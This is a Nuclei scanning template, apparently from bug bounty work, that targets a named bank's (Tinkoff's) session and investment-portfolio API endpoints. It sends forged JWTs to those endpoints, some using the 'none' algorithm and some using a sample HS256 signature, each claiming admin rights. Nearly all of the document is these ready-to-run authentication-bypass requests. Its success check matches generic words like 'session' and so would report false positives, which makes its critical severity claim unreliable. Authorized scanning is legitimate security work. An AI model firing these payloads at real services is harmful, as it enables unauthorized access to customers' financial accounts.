id: tinkoff-jwt-manipulation

info:
  name: Tinkoff - JWT Token Manipulation
  author: bugbounty
  severity: critical
  description: JWT manipulation via none algorithm and weak signatures
  tags: jwt,authentication,tinkoff

http:
  - raw:
      - |
        GET /api/common/v1/session_info?platform=web&sessionid=test HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.

      - |
        GET /api/invest/portfolio/instruments/v2 HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

      - |
        POST /api/common/v1/session_info HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Authorization: Bearer eyJhbGciOiJub25lIn0.eyJpc0FkbWluIjp0cnVlfQ.

        {"platform":"web"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: word
        part: body
        words:
          - "admin"
          - "success"
          - "authenticated"
          - "session"
        condition: or
